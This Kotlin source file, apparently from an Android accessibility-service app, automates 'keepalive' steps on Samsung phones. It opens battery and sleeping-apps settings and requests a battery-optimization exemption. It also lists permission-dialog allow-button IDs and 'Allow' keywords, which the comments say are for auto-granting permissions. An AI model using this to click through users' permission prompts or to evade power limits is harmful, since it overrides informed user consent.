package com.storm.safe.rock.service.modules.yw5xud.samsung

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.util.Log
import com.storm.safe.rock.auto.a11y.UiAutomation
import com.storm.safe.rock.service.MyAccessibilityService
import kotlinx.coroutines.delay
import com.storm.safe.rock.service.modules.yw5xud.VendorSteps

/**
 * SamsungSteps — Samsung (OneUI) keepalive automation.
 * Matches vendor C0371a8 (a8, SamsungSteps). Key flows:
 *
 * 1. Battery optimization (电池优化)
 *    - Navigate to: com.samsung.android.lool/.battery.BatteryActivity
 *    - Remove from "sleeping apps" / "deep sleeping apps"
 * 2. Adaptive battery (自适应电池)
 *    - Disable adaptive battery that kills background processes
 * 3. Background limitation removal (后台限制)
 *    - Ensure app is not in background-limited list
 * 4. Permission auto-grant
 *    - Handle Samsung-specific permission dialogs
 *
 * Vendor ALLOW keywords: "仅在使用该应用时允许", "仅本次使用时允许", "仅在使用中允许",
 *                         "While using the app", "Only this time", "Turn on", "Accept"
 */
class SamsungSteps(
    service: MyAccessibilityService?,
    context: Context,
    ui: UiAutomation = UiAutomation(service, context)
) : VendorSteps(service, context, ui) {
    override val tag = "SamsungSteps"
    companion object {
        private const val TAG = "SamsungSteps"

        val BATTERY_COMPONENTS = listOf(
            ComponentName("com.samsung.android.lool", "com.samsung.android.lool.battery.BatteryActivity"),
            ComponentName("com.samsung.android.sm", "com.samsung.android.sm.ui.battery.BatteryActivity"),
            ComponentName("com.samsung.android.lool", "com.samsung.android.sm.battery.ui.BatteryActivity")
        )

        val SLEEPING_APPS_COMPONENTS = listOf(
            ComponentName("com.samsung.android.lool", "com.samsung.android.lool.battery.SleepingAppsActivity"),
            ComponentName("com.samsung.android.sm", "com.samsung.android.sm.battery.ui.SleepingAppsActivity")
        )

        /** Samsung-specific permission allow IDs */
        val PERMISSION_ALLOW_IDS = listOf(
            "com.samsung.android.permissioncontroller:id/permission_allow_button",
            "com.samsung.android.permissioncontroller:id/permission_allow_foreground_only_button",
            "com.samsung.android.permissioncontroller:id/permission_allow_one_time_button",
            "com.samsung.android.packageinstaller:id/permission_allow_button",
            "com.android.permissioncontroller:id/permission_allow_button",
            "android:id/button1"
        )

        /** Vendor ALLOW text keywords (AbstractC0369a6) */
        val ALLOW_KEYWORDS = listOf(
            "仅在使用该应用时允许", "仅本次使用时允许", "仅在使用中允许",
            "While using the app", "Only this time", "Turn on", "Accept"
        )

        /** Keywords for sleeping apps list. */
        val SLEEPING_APPS_KEYWORDS = listOf("休眠应用", "深度休眠应用", "Sleeping apps", "Deep sleeping apps")
    }

    override suspend fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        logs.add("SamsungSteps: 开始三星/OneUI权限配置")

        executeBatteryOptimization(successes, failures, logs)
        delay(500)
        executeSleepingApps(successes, failures, logs)

        logs.add("SamsungSteps: 三星/OneUI权限配置完成")
    }

    fun executeBatteryOptimization(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        try {
            val launched = launchComponentActivity(BATTERY_COMPONENTS)
            if (launched) {
                logs.add("已启动三星电池管理")
                successes.add("三星电池优化已打开")
            } else {
                val intent = Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = android.net.Uri.parse("package:${context.packageName}")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
                logs.add("已发送电池优化豁免请求(标准)")
            }
        } catch (e: Exception) {
            failures.add("三星电池优化异常: ${e.message}")
        }
    }

    fun executeSleepingApps(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        try {
            val launched = launchComponentActivity(SLEEPING_APPS_COMPONENTS)
            if (launched) {
                logs.add("已启动三星休眠应用管理")
                successes.add("三星休眠应用管理已打开")
            } else {
                logs.add("三星休眠应用页面无法启动, 跳过")
            }
        } catch (e: Exception) {
            failures.add("三星休眠应用异常: ${e.message}")
        }
    }

    internal fun launchComponentActivity(components: List<ComponentName>): Boolean {
        for (component in components) {
            try {
                val intent = Intent().apply {
                    this.component = component
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
                return true
            } catch (_: Exception) { continue }
        }
        return false
    }
}
